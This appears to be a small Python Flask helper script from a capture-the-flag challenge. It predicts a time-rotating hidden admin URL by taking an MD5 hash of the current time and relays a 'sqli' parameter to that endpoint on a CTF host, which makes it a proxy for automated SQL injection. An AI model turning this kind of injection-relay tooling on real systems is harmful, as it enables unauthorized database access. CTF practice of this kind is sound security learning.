from flask import Flask, request
from hashlib import md5
import requests
import datetime

app = Flask(__name__)
@app.route("/")
def handler():

	# Get SQL param
	sqli = request.args.get("sqli", None)
	data = {"id":sqli}

	# Get current admin URL
	now = (datetime.datetime.utcnow().strftime("%H%M%S")[:-1] + "0").encode('utf-8')
	url_hash = md5(now).hexdigest()

	# Send response
	resp = requests.get("http://university.opentoallctf.com:40001/admin/{}".format(url_hash), data=data)
	return resp.text, resp.status_code

if __name__ == '__main__':
	app.run(host="127.0.0.1",port=8000)
